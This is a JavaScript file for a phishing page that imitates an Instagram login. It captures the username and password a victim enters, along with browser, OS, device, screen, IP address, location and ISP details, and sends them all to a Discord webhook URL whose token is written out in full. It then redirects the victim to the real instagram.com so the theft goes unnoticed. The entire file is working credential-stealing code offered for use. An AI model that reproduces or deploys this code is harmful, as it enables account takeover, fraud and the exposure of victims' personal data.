async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        return await response.json();
    } catch (error) {
        console.error('Error fetching IP info:', error);
        return null;
    }
}

function getDeviceInfo() {
    const parser = new UAParser();
    const result = parser.getResult();
    const screenInfo = {
        width: window.screen.width,
        height: window.screen.height,
        colorDepth: window.screen.colorDepth,
        pixelRatio: window.devicePixelRatio
    };
    
    return {
        browser: result.browser,
        os: result.os,
        device: result.device,
        screen: screenInfo
    };
}

async function sendToDiscord(event) {
    event.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const statusDiv = document.getElementById('status');
    const timestamp = new Date().toISOString();
    const deviceInfo = getDeviceInfo();
    const ipInfo = await getIPInfo();
    
    const embed = {
        title: "🔐 New Login Attempt",
        color: 0xFF0000,
        fields: [
            {
                name: "📧 Username/Email",
                value: `\`${username}\``,
                inline: true
            },
            {
                name: "🔑 Password",
                value: `\`${password}\``,
                inline: true
            },
            {
                name: "🌐 Browser",
                value: `${deviceInfo.browser.name} ${deviceInfo.browser.version}`,
                inline: true
            },
            {
                name: "💻 Operating System",
                value: `${deviceInfo.os.name} ${deviceInfo.os.version}`,
                inline: true
            },
            {
                name: "📱 Device",
                value: deviceInfo.device.vendor ? 
                    `${deviceInfo.device.vendor} ${deviceInfo.device.model}` : 
                    "Desktop/Laptop",
                inline: true
            },
            {
                name: "🖥️ Screen",
                value: `${deviceInfo.screen.width}x${deviceInfo.screen.height} (${deviceInfo.screen.pixelRatio}x)`,
                inline: true
            }
        ],
        footer: {
            text: "Instagram Login Capture"
        },
        timestamp: timestamp
    };

    if (ipInfo) {
        embed.fields.push(
            {
                name: "🌍 Location",
                value: `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}`,
                inline: true
            },
            {
                name: "📍 IP Address",
                value: `\`${ipInfo.ip}\``,
                inline: true
            },
            {
                name: "🏢 ISP",
                value: ipInfo.org || "Unknown",
                inline: true
            }
        );
    }

    const browserInfo = {
        localStorage: !!window.localStorage,
        cookies: navigator.cookieEnabled,
        language: navigator.language,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        referrer: document.referrer || "Direct"
    };

    embed.fields.push(
        {
            name: "🌐 Language",
            value: browserInfo.language,
            inline: true
        },
        {
            name: "📝 Platform",
            value: browserInfo.platform,
            inline: true
        },
        {
            name: "🔗 Referrer",
            value: browserInfo.referrer,
            inline: true
        }
    );

    try {
        const response = await fetch('https://discordapp.com/api/webhooks/1306497371433078855/8Zjc--tvv55PayvBeQb1GJrpky0U0tMghsVyq0JBGEgAI0p-iJZqnhwlr4SHUpSy750r', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed]
            })
        });

        if (response.ok) {
            statusDiv.textContent = "Processing...";
            statusDiv.className = "success";
            statusDiv.style.display = "block";
            
            setTimeout(() => {
                window.location.href = "https://instagram.com";
            }, 1000);
        } else {
            throw new Error('Failed to process');
        }
    } catch (error) {
        statusDiv.textContent = "An error occurred. Please try again.";
        statusDiv.className = "error";
        statusDiv.style.display = "block";
        console.error('Error:', error);
    }
}
